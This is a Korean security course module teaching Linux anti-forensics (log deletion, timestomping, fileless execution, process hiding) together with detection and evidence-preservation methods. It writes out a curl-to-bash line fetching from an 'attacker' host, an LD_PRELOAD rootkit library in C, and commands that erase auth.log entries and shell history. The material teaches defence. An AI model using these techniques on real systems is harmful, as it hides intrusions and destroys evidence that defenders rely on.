# Week 11: 안티포렌식 — 로그 삭제, 타임스탬프 조작, 메모리 전용 공격

## 학습 목표
- **안티포렌식(Anti-Forensics)**의 개념과 APT에서의 활용을 이해한다
- **로그 삭제 및 조작** 기법으로 공격 흔적을 제거하는 방법을 실습할 수 있다
- **타임스탬프 조작**(timestomping)으로 파일 시간 정보를 변조할 수 있다
- **메모리 전용(fileless) 공격**의 원리를 이해하고 디스크에 흔적을 남기지 않는 기법을 실습할 수 있다
- **디스크 안티포렌식**(파일 와이핑, 슬랙 스페이스)의 원리를 이해한다
- 안티포렌식에 대응하는 **포렌식 기법**을 이해하고 증거 보전 방법을 설명할 수 있다
- MITRE ATT&CK Defense Evasion의 안티포렌식 관련 기법을 매핑할 수 있다

## 전제 조건
- Linux 파일 시스템(inode, 타임스탬프, 로그 구조)을 이해하고 있어야 한다
- 시스템 로그(syslog, auth.log, journalctl)의 구조를 알고 있어야 한다
- 기본 메모리 구조(프로세스, 가상 메모리)를 이해하고 있어야 한다
- 셸 스크립트와 Python 기초를 할 수 있어야 한다

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 실습 기지 | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | 방화벽/IPS | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 안티포렌식 실습 대상 | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (로그 무결성 검증) | `sshpass -p1 ssh siem@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:35 | 안티포렌식 이론 + 분류 | 강의 |
| 0:35-1:10 | 로그 삭제/조작 실습 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:55 | 타임스탬프 조작 실습 | 실습 |
| 1:55-2:30 | 메모리 전용 공격 실습 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 포렌식 대응 + 종합 실습 | 실습 |
| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |

---

# Part 1: 안티포렌식 이론 (35분)

## 1.1 안티포렌식 분류

| 카테고리 | 기법 | 목적 | ATT&CK |
|---------|------|------|--------|
| **로그 삭제** | auth.log, syslog 삭제/절삭 | 행위 기록 제거 | T1070.002 |
| **로그 조작** | 특정 행 삭제, 시간 변조 | 타임라인 혼란 | T1070.002 |
| **타임스탬프** | touch, timestomp | 파일 시간 변조 | T1070.006 |
| **파일 삭제** | rm, shred, wipe | 악성 파일 제거 | T1070.004 |
| **메모리 전용** | fileless malware | 디스크 흔적 없음 | T1059 |
| **암호화** | 증거 암호화 | 분석 방해 | T1027 |
| **스테가노그래피** | 데이터 은닉 | 증거 은닉 | T1001.002 |
| **히스토리 삭제** | .bash_history 클리어 | 명령 기록 제거 | T1070.003 |
| **프로세스 은닉** | rootkit, LD_PRELOAD | 실행 은닉 | T1014 |

## 1.2 Linux 주요 로그 파일

| 로그 파일 | 내용 | 공격자 목적 |
|----------|------|-----------|
| `/var/log/auth.log` | SSH 인증, sudo 기록 | 접속 흔적 제거 |
| `/var/log/syslog` | 시스템 전반 이벤트 | 서비스 조작 은닉 |
| `/var/log/wtmp` | 로그인 기록 (바이너리) | 접속 기록 삭제 |
| `/var/log/btmp` | 실패 로그인 (바이너리) | 브루트포스 은닉 |
| `/var/log/lastlog` | 최종 로그인 (바이너리) | 마지막 접속 위장 |
| `~/.bash_history` | 셸 명령 기록 | 명령 은닉 |
| `/var/log/apache2/` | 웹 서버 접근 로그 | 웹 공격 은닉 |
| `/var/log/suricata/` | IDS 알림 | 탐지 기록 제거 |

---

# Part 2: 로그 삭제와 조작 (35분)

## 실습 2.1: 로그 삭제 기법과 탐지

> **실습 목적**: 다양한 로그 삭제/조작 기법을 실습하고, 각 기법의 탐지 가능성을 확인한다
>
> **배우는 것**: 로그 파일 삭제, 특정 행 제거, 바이너리 로그 조작, 셸 히스토리 클리어를 배운다
>
> **결과 해석**: 로그가 삭제/조작된 후에도 SIEM에 원본이 남아있으면 포렌식 가능이다
>
> **실전 활용**: Red Team은 흔적 제거를, Blue Team은 증거 보전을 위해 이 지식을 활용한다
>
> **명령어 해설**: sed로 특정 행 삭제, cat /dev/null로 내용 비우기, shred로 안전 삭제를 수행한다
>
> **트러블슈팅**: 로그 서버(SIEM)로 전달된 로그는 로컬 삭제로 제거 불가하다

```bash
# 로그 삭제 기법 시뮬레이션 (교육용 임시 파일 사용)
echo "=== 로그 삭제 기법 시뮬레이션 ==="

# 임시 로그 파일 생성
mkdir -p /tmp/af_demo
cat > /tmp/af_demo/auth.log << 'LOG'
Mar 25 10:00:01 web sshd[1234]: Accepted publickey for admin from 10.20.30.201
Mar 25 10:05:23 web sshd[1235]: Accepted password for attacker from 10.20.30.201
Mar 25 10:10:45 web sudo: attacker : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/bash
Mar 25 10:15:00 web sshd[1236]: Accepted publickey for admin from 10.20.30.100
Mar 25 10:20:00 web cron[1237]: (root) CMD (/usr/bin/backup.sh)
LOG

echo "[원본 로그]"
cat /tmp/af_demo/auth.log

echo ""
echo "[기법 1] 특정 행 삭제 (sed)"
# 'attacker' 포함 행만 삭제
sed -i '/attacker/d' /tmp/af_demo/auth.log
echo "결과:"
cat /tmp/af_demo/auth.log

echo ""
echo "[기법 2] 파일 내용 비우기"
cp /tmp/af_demo/auth.log /tmp/af_demo/auth2.log
cat /dev/null > /tmp/af_demo/auth2.log
echo "파일 크기: $(wc -c < /tmp/af_demo/auth2.log) 바이트"

echo ""
echo "[기법 3] 안전 삭제 (shred)"
echo "sensitive data" > /tmp/af_demo/evidence.txt
shred -u -z -n 3 /tmp/af_demo/evidence.txt 2>/dev/null
ls -la /tmp/af_demo/evidence.txt 2>/dev/null || echo "파일 완전 삭제됨"

echo ""
echo "[기법 4] 셸 히스토리 클리어"
echo "  export HISTFILE=/dev/null   # 세션 기록 비활성"
echo "  history -c                  # 현재 세션 기록 삭제"
echo "  unset HISTFILE              # 파일 저장 중지"
echo "  cat /dev/null > ~/.bash_history  # 기록 파일 비우기"

echo ""
echo "=== 탐지 포인트 ==="
echo "1. 로그 파일 크기 갑작스러운 감소 (Wazuh FIM)"
echo "2. 로그 시퀀스 번호 불연속"
echo "3. 시스템 시간과 로그 시간 불일치"
echo "4. SIEM에 원본 로그 존재 (로컬 삭제 무의미)"

rm -rf /tmp/af_demo
```

---

# Part 3: 타임스탬프 조작 (35분)

## 3.1 Linux 파일 타임스탬프

| 타임스탬프 | 약어 | 의미 | 변경 조건 |
|-----------|------|------|----------|
| **Access Time** | atime | 마지막 읽기 | 파일 읽기 시 |
| **Modify Time** | mtime | 마지막 내용 변경 | 파일 쓰기 시 |
| **Change Time** | ctime | 마지막 메타데이터 변경 | chmod, chown 시 |
| **Birth Time** | btime | 파일 생성 시간 | 생성 시 (ext4) |

## 실습 3.1: 타임스탬프 조작과 탐지

> **실습 목적**: touch, debugfs 등으로 타임스탬프를 조작하고, 조작 흔적을 탐지하는 방법을 배운다
>
> **배우는 것**: atime/mtime 조작, ctime 조작의 한계, inode 기반 탐지를 배운다
>
> **결과 해석**: stat 명령으로 조작 전후의 타임스탬프를 비교하여 변조를 확인한다
>
> **실전 활용**: 포렌식에서 파일 타임라인 분석 시 타임스탬프 조작 가능성을 고려해야 한다
>
> **명령어 해설**: touch -t는 atime/mtime을, debugfs는 ctime까지 변경할 수 있다
>
> **트러블슈팅**: ctime은 일반 도구로 변경 불가하며, 커널 레벨 조작이 필요하다

```bash
# 타임스탬프 조작 실습
echo "=== 타임스탬프 조작 실습 ==="

# 테스트 파일 생성
echo "malware payload" > /tmp/ts_test.txt
echo "[원본 타임스탬프]"
stat /tmp/ts_test.txt | grep -E "Access|Modify|Change|Birth"

echo ""
echo "[기법 1] touch로 atime/mtime 조작"
# 2023년 1월 1일로 변경 (공격 전 날짜로 위장)
touch -t 202301010000 /tmp/ts_test.txt
echo "조작 후:"
stat /tmp/ts_test.txt | grep -E "Access|Modify|Change"
echo "→ atime/mtime은 변경되었지만 ctime은 현재 시간으로 갱신됨!"

echo ""
echo "[기법 2] 참조 파일의 타임스탬프 복사"
# 정상 파일의 타임스탬프를 악성 파일에 복사
touch -r /etc/hostname /tmp/ts_test.txt
echo "참조 파일 복사 후:"
stat /tmp/ts_test.txt | grep -E "Access|Modify|Change"

echo ""
echo "[탐지 방법]"
echo "1. ctime은 touch로 변경 불가 → atime/mtime과 ctime의 불일치 탐지"
echo "2. inode 번호와 생성 시간 비교"
echo "3. ext4 저널에서 원본 타임스탬프 복구 가능"
echo "4. Wazuh FIM(File Integrity Monitoring)으로 변경 탐지"

rm -f /tmp/ts_test.txt
```

---

# Part 4: 메모리 전용 공격과 포렌식 대응 (35분)

## 4.1 Fileless 공격

Fileless(메모리 전용) 공격은 디스크에 파일을 쓰지 않고 **메모리에서만 실행**되는 공격이다.

| 기법 | 설명 | 예시 | ATT&CK |
|------|------|------|--------|
| **메모리 실행** | 코드를 메모리에 직접 로드 | memfd_create, 반사적 DLL | T1620 |
| **인터프리터 악용** | Python, PowerShell 등 | python -c 'malicious_code' | T1059 |
| **프로세스 주입** | 정상 프로세스 메모리에 주입 | ptrace, LD_PRELOAD | T1055 |
| **커널 메모리** | 커널 모듈 동적 로드 | insmod, kmod | T1547.006 |

## 실습 4.1: 메모리 전용 실행 시뮬레이션

> **실습 목적**: 디스크에 흔적을 남기지 않는 메모리 전용 공격 기법을 시뮬레이션한다
>
> **배우는 것**: Python/bash 인라인 실행, /dev/shm 활용, memfd_create의 원리를 배운다
>
> **결과 해석**: /proc에서만 확인 가능하고 디스크에 파일이 없으면 fileless 성공이다
>
> **실전 활용**: APT가 EDR/안티바이러스를 우회하기 위해 fileless 기법을 사용한다
>
> **명령어 해설**: python3 -c로 인라인 코드 실행, /dev/shm은 RAM 기반 파일시스템이다
>
> **트러블슈팅**: 메모리 포렌식(volatility)으로 탐지 가능하다

```bash
echo "=== 메모리 전용 공격 시뮬레이션 ==="

echo ""
echo "[기법 1] Python 인라인 실행 (디스크 파일 없음)"
python3 -c "
import subprocess
result = subprocess.run(['id'], capture_output=True, text=True)
print(f'실행 결과: {result.stdout.strip()}')
print('디스크에 Python 스크립트 파일이 존재하지 않음')
"

echo ""
echo "[기법 2] /dev/shm (RAM 파일시스템) 활용"
echo '#!/bin/bash
echo "RAM에서 실행: $(hostname) ($(id))"' > /dev/shm/.hidden_script
chmod +x /dev/shm/.hidden_script
/dev/shm/.hidden_script
echo "  /dev/shm 파일: $(ls -la /dev/shm/.hidden_script 2>/dev/null)"
echo "  재부팅 시 자동 삭제됨 (RAM 기반)"
rm -f /dev/shm/.hidden_script

echo ""
echo "[기법 3] 파이프 기반 실행 (파일 생성 없음)"
echo 'echo "파이프 실행: $(whoami)@$(hostname)"' | bash

echo ""
echo "[기법 4] curl + 파이프 (원격 코드 실행)"
echo "  curl -s http://attacker/payload.sh | bash"
echo "  (디스크에 payload.sh가 저장되지 않음)"

echo ""
echo "=== 탐지 방법 ==="
echo "1. /proc/[pid]/exe → (deleted) 표시 시 fileless 의심"
echo "2. /proc/[pid]/maps → 비정상 메모리 매핑"
echo "3. /proc/[pid]/cmdline → 인라인 코드 실행 패턴"
echo "4. 메모리 포렌식: volatility3, LiME"
echo "5. auditd: execve 시스템 콜 모니터링"
```

## 실습 4.2: 포렌식 대응과 증거 보전

> **실습 목적**: 안티포렌식에 대응하여 증거를 수집하고 보전하는 포렌식 기법을 배운다
>
> **배우는 것**: 메모리 덤프, 디스크 이미징, 로그 수집, 타임라인 분석의 포렌식 절차를 배운다
>
> **결과 해석**: 안티포렌식 기법에도 불구하고 증거를 복구할 수 있으면 포렌식 대응 성공이다
>
> **실전 활용**: 인시던트 대응(IR) 시 증거 보전과 분석에 직접 활용한다
>
> **명령어 해설**: dd로 디스크 이미징, /proc에서 프로세스 정보 수집을 수행한다
>
> **트러블슈팅**: 증거 수집은 시스템 변경을 최소화하면서 수행해야 한다

```bash
echo "=== 포렌식 대응 + 증거 보전 ==="

echo ""
echo "[1] 휘발성 증거 수집 (메모리 우선)"
echo "--- 현재 프로세스 ---"
ps aux --sort=-%mem 2>/dev/null | head -10

echo ""
echo "--- 네트워크 연결 ---"
ss -tnp 2>/dev/null | head -10

echo ""
echo "--- /dev/shm 확인 (RAM 디스크) ---"
ls -la /dev/shm/ 2>/dev/null | head -10

echo ""
echo "[2] 로그 무결성 확인"
echo "--- auth.log 최근 기록 ---"
tail -5 /var/log/auth.log 2>/dev/null || echo "접근 불가"
echo "--- 로그 파일 크기 변화 ---"
ls -la /var/log/auth.log /var/log/syslog 2>/dev/null

echo ""
echo "[3] 타임스탬프 이상 탐지"
echo "--- 최근 수정된 시스템 파일 ---"
find /etc /usr/bin /usr/sbin -mmin -60 -type f 2>/dev/null | head -10

echo ""
echo "[4] SIEM 교차 검증"
sshpass -p1 ssh siem@10.20.30.100 \
  "echo '--- Wazuh FIM 알림 ---'; grep 'integrity' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3 | python3 -c '
import sys,json
for l in sys.stdin:
    try:
        d=json.loads(l); print(f\"  {d.get(\\\"rule\\\",{}).get(\\\"description\\\",\\\"?\\\")[:60]}\")
    except: pass' 2>/dev/null || echo '  FIM 알림 없음'" 2>/dev/null

echo ""
echo "=== 증거 보전 원칙 ==="
echo "1. 휘발성 순서: 메모리 → 네트워크 → 프로세스 → 디스크"
echo "2. 증거 무결성: 해시(SHA256) 기록"
echo "3. 보관 연속성(Chain of Custody)"
echo "4. 원본 보존: 이미지 복사본으로 분석"
```

## 실습 4.3: 프로세스 은닉 기법

> **실습 목적**: 실행 중인 악성 프로세스를 탐지하기 어렵게 은닉하는 기법을 배운다
>
> **배우는 것**: 프로세스명 변경, LD_PRELOAD를 이용한 은닉, /proc 조작의 원리를 배운다
>
> **결과 해석**: ps aux에서 프로세스가 정상 프로세스로 위장되면 은닉 성공이다
>
> **실전 활용**: APT의 지속성 유지와 탐지 회피에 사용되는 고급 기법이다
>
> **명령어 해설**: exec -a로 프로세스명을 변경하고, LD_PRELOAD로 라이브러리를 주입한다
>
> **트러블슈팅**: /proc/[pid]/exe는 원본 바이너리를 가리키므로 완전 은닉은 어렵다

```bash
echo "=== 프로세스 은닉 기법 ==="

echo ""
echo "[기법 1] 프로세스명 변경 (argv[0])"
# 백그라운드 프로세스를 정상 이름으로 위장
bash -c 'exec -a "[kworker/0:1-events]" sleep 10' &
HIDDEN_PID=$!
echo "  위장된 프로세스:"
ps aux | grep "$HIDDEN_PID" | grep -v grep
kill $HIDDEN_PID 2>/dev/null

echo ""
echo "[기법 2] 숨김 디렉토리 활용"
echo "  mkdir -p /tmp/...       # 점 3개 디렉토리 (ls에서 간과)"
echo "  mkdir -p /dev/shm/.X11  # 정상 X11 캐시처럼 위장"
echo "  mkdir -p /var/tmp/.ICE  # 정상 임시 파일처럼 위장"

echo ""
echo "[기법 3] LD_PRELOAD 라이브러리 은닉"
cat << 'LD_PRELOAD_DEMO'
원리:
  LD_PRELOAD 환경변수에 악성 공유 라이브러리를 지정하면,
  모든 프로세스에서 해당 라이브러리의 함수가 우선 호출됨.

  예: readdir() 함수를 후킹하여 특정 파일/프로세스를 숨김
      → ls, ps 명령이 악성 파일/프로세스를 표시하지 않음

코드 (교육용):
  // evil_lib.c
  #define _GNU_SOURCE
  #include <dirent.h>
  #include <dlfcn.h>
  #include <string.h>
  struct dirent *readdir(DIR *dirp) {
      static struct dirent *(*orig_readdir)(DIR *) = NULL;
      if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");
      struct dirent *d;
      while ((d = orig_readdir(dirp)) != NULL) {
          if (strstr(d->d_name, "malware") == NULL) return d;
          // "malware" 포함 파일명 숨김
      }
      return NULL;
  }

사용:
  gcc -shared -fPIC -o /tmp/.evil.so evil_lib.c -ldl
  export LD_PRELOAD=/tmp/.evil.so
  ls /tmp/  # malware 포함 파일이 보이지 않음!

탐지:
  1. /etc/ld.so.preload 파일 확인
  2. /proc/[pid]/maps에서 비정상 라이브러리
  3. env | grep LD_PRELOAD
  4. ldd 바이너리 출력 비교
LD_PRELOAD_DEMO

echo ""
echo "[기법 4] 커널 수준 rootkit 원리"
echo "  LKM(Loadable Kernel Module) rootkit:"
echo "  → sys_call_table 후킹으로 커널 레벨에서 은닉"
echo "  → getdents() 후킹 → 파일 은닉"
echo "  → sys_read() 후킹 → /proc 내용 변조"
echo "  → kill() 후킹 → 프로세스 보호"
echo ""
echo "  탐지: rkhunter, chkrootkit, LKRG(커널 무결성)"
echo "  대응: 부팅 가능한 외부 미디어에서 검사"
```

## 실습 4.4: 안티포렌식 종합 시나리오

> **실습 목적**: 공격의 전체 흔적을 체계적으로 제거하는 종합 안티포렌식 시나리오를 실행한다
>
> **배우는 것**: 다층 안티포렌식 기법의 조합과 각 기법의 한계점을 배운다
>
> **결과 해석**: 로컬 증거가 최대한 제거되었으나 SIEM에 원본이 남아있는지 확인한다
>
> **실전 활용**: Red Team의 OPSEC 관리와 Blue Team의 증거 보전 양면에서 활용한다
>
> **명령어 해설**: 로그, 히스토리, 타임스탬프, 임시 파일의 정리를 종합 수행한다
>
> **트러블슈팅**: SIEM으로 전달된 로그는 로컬에서 제거할 수 없다

```bash
echo "============================================================"
echo "       안티포렌식 종합 시나리오                                "
echo "============================================================"

echo ""
echo "[Phase 1] 공격 흔적 목록화"
echo "  흔적 유형          위치                    제거 방법"
echo "  ─────────────────────────────────────────────────────"
echo "  SSH 로그인          /var/log/auth.log       sed 행 삭제"
echo "  명령 히스토리       ~/.bash_history          cat /dev/null"
echo "  웹 요청 로그       /var/log/apache2/        sed 행 삭제"
echo "  악성 파일          /tmp/, /dev/shm/         shred + rm"
echo "  네트워크 연결       ss/netstat               프로세스 종료"
echo "  Suricata 알림      fast.log                 원격 삭제"
echo "  Wazuh 알림         alerts.json              ★제거 불가★"

echo ""
echo "[Phase 2] 흔적 제거 시뮬레이션 (교육용)"
echo "  # 1. 히스토리 비활성화"
echo "  unset HISTFILE"
echo "  export HISTSIZE=0"
echo ""
echo "  # 2. 로그에서 특정 IP 제거"
echo "  sed -i '/10.20.30.201/d' /var/log/auth.log"
echo ""
echo "  # 3. 악성 파일 안전 삭제"
echo "  shred -u -z -n 3 /tmp/exploit.sh"
echo ""
echo "  # 4. 타임스탬프 복원"
echo "  touch -r /etc/hostname /path/to/modified_file"
echo ""
echo "  # 5. 임시 파일 정리"
echo "  rm -rf /tmp/.*hidden* /dev/shm/.*"

echo ""
echo "[Phase 3] 제거 불가능한 증거 (포렌식 관점)"
echo "  1. SIEM에 전달된 로그 (원격 서버)"
echo "  2. 네트워크 패킷 캡처 (SPAN/TAP)"
echo "  3. ext4 저널 (삭제 파일 복구 가능)"
echo "  4. swap 영역 (메모리 내용 잔류)"
echo "  5. inode 테이블 (삭제된 파일 메타데이터)"
echo "  6. /proc 스냅샷 (메모리 덤프)"
echo "  7. auditd 로그 (커널 수준 기록)"

echo ""
echo "[Phase 4] SIEM 교차 검증"
sshpass -p1 ssh siem@10.20.30.100 \
  "echo 'SIEM에 보존된 증거 수:' && wc -l < /var/ossec/logs/alerts/alerts.json 2>/dev/null || echo 'N/A'" 2>/dev/null

echo ""
echo "============================================================"
echo "  결론: 완전한 안티포렌식은 불가능하다.                       "
echo "  SIEM + 네트워크 캡처 + 메모리 포렌식 = 증거 복구 가능     "
echo "============================================================"
```

---

## 검증 체크리스트

| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
|------|---------|----------|----------|
| 1 | 로그 행 삭제 | sed -i | 특정 행 제거 |
| 2 | 로그 비우기 | cat /dev/null | 0바이트 |
| 3 | 안전 삭제 | shred | 파일 복구 불가 |
| 4 | 히스토리 클리어 | HISTFILE | 기록 무효화 |
| 5 | 타임스탬프 조작 | touch -t | atime/mtime 변경 |
| 6 | ctime 한계 | stat | ctime 변경 불가 확인 |
| 7 | fileless 실행 | python -c | 디스크 파일 없음 |
| 8 | /dev/shm 활용 | RAM 실행 | 재부팅 시 삭제 |
| 9 | 포렌식 수집 | 증거 수집 | 5항목 이상 수집 |
| 10 | SIEM 교차검증 | Wazuh | 로컬 삭제 불구 보존 |

---

## 자가 점검 퀴즈

**Q1.** Linux에서 ctime을 touch로 변경할 수 없는 이유는?

<details><summary>정답</summary>
ctime(Change Time)은 파일의 메타데이터(권한, 소유자, 크기 등)가 변경될 때 커널이 자동으로 갱신한다. touch로 atime/mtime을 변경하면 이것도 메타데이터 변경이므로 ctime이 현재 시간으로 갱신된다. ctime을 조작하려면 커널 레벨 조작(debugfs 등)이 필요하다.
</details>

**Q2.** SIEM으로 로그를 전달하면 안티포렌식에 대응할 수 있는 이유는?

<details><summary>정답</summary>
로그가 실시간으로 SIEM(원격 서버)에 전달되면, 공격자가 로컬 호스트의 로그를 삭제해도 SIEM에 원본이 보존된다. 공격자는 피해 시스템과 SIEM 모두를 장악해야 완전한 로그 삭제가 가능하므로 공격 난이도가 크게 높아진다.
</details>

**Q3.** fileless(메모리 전용) 공격의 장점과 한계는?

<details><summary>정답</summary>
장점: 디스크에 파일을 쓰지 않으므로 파일 기반 안티바이러스 탐지를 회피하고, 재부팅 시 흔적이 사라진다. 한계: 메모리 포렌식으로 탐지 가능하고, 지속성(persistence) 확보가 어렵다. 또한 프로세스 모니터링(auditd)으로 인라인 실행이 탐지될 수 있다.
</details>

**Q4.** shred와 rm의 차이점은?

<details><summary>정답</summary>
rm은 파일의 디렉토리 엔트리만 삭제하여 데이터 복구 도구(extundelete 등)로 복원할 수 있다. shred는 파일 데이터를 랜덤 데이터로 여러 번 덮어쓴 후 삭제하므로 데이터 복구가 불가능하다. 단, SSD의 wear-leveling으로 인해 shred도 완벽하지 않을 수 있다.
</details>

**Q5.** 타임스탬프 조작을 탐지하는 포렌식 기법 3가지는?

<details><summary>정답</summary>
1. atime/mtime과 ctime의 불일치 검사 (ctime이 더 최근이면 조작 의심)
2. 저널(ext4 journal)에서 원본 타임스탬프 복구
3. inode 번호와 생성 시간의 순서 확인 (높은 inode인데 오래된 시간이면 의심)
</details>

**Q6.** /dev/shm을 안티포렌식에 활용하는 이유는?

<details><summary>정답</summary>
/dev/shm은 RAM 기반 tmpfs 파일시스템으로, 저장된 파일이 디스크에 쓰이지 않는다. 공격 도구를 여기에 저장하면 재부팅 시 자동으로 삭제되고, 디스크 포렌식으로 복구할 수 없다. 또한 일부 보안 도구는 /dev/shm을 모니터링하지 않는다.
</details>

**Q7.** auditd가 fileless 공격을 탐지할 수 있는 원리는?

<details><summary>정답</summary>
auditd는 커널 레벨에서 시스템 콜(execve, fork, open 등)을 모니터링한다. fileless 공격도 결국 시스템 콜을 호출하므로, execve로 python3 -c 'malicious_code'가 실행되면 기록된다. 메모리에서만 실행해도 시스템 콜은 숨길 수 없다.
</details>

**Q8.** 디지털 포렌식에서 증거 수집의 휘발성 순서는?

<details><summary>정답</summary>
가장 휘발성이 높은(빨리 사라지는) 것부터: 1) CPU 레지스터/캐시 → 2) 메모리(RAM) → 3) 네트워크 연결 → 4) 실행 중인 프로세스 → 5) 디스크 → 6) 백업 매체. 가장 휘발성이 높은 것부터 우선 수집해야 한다.
</details>

**Q9.** wtmp/btmp 바이너리 로그에서 특정 기록을 삭제하는 방법과 탐지는?

<details><summary>정답</summary>
utmpdump로 바이너리를 텍스트로 변환, 특정 행 삭제 후 utmpdump -r로 재변환한다. 또는 전용 도구(wtmpclean)를 사용한다. 탐지: 레코드 간 시간 불연속, 파일 크기 변화, SIEM에 원본 last/lastb 기록과 불일치.
</details>

**Q10.** 실습 환경에서 완전한 안티포렌식이 불가능한 이유는?

<details><summary>정답</summary>
Wazuh SIEM(10.20.30.100)이 각 서버의 로그를 실시간으로 수집하고 있다. 로컬 서버의 로그를 삭제해도 SIEM에 원본이 남아있다. 완전한 안티포렌식을 위해서는 web, secu, siem 서버 모두를 장악하고 각각의 로그를 삭제해야 하며, 네트워크 패킷 캡처도 삭제해야 한다.
</details>

---

## 과제

### 과제 1: 안티포렌식 vs 포렌식 매트릭스 (개인)
이번 주 학습한 모든 안티포렌식 기법에 대해, 각각의 포렌식 대응 방법을 매핑하는 매트릭스를 작성하라. 안티포렌식의 성공 조건과 탐지 방법을 포함할 것.

### 과제 2: 인시던트 대응 SOP (팀)
안티포렌식이 적용된 공격에 대한 인시던트 대응 표준 운영 절차(SOP)를 작성하라. 증거 수집 순서, 보전 방법, 분석 도구, 보고 양식을 포함할 것.

### 과제 3: Fileless 공격 탐지 규칙 (팀)
메모리 전용 공격을 탐지하기 위한 auditd/Wazuh 규칙 5개를 작성하라. 각 규칙의 탐지 로직, 예상 오탐, 튜닝 방안을 설명할 것.
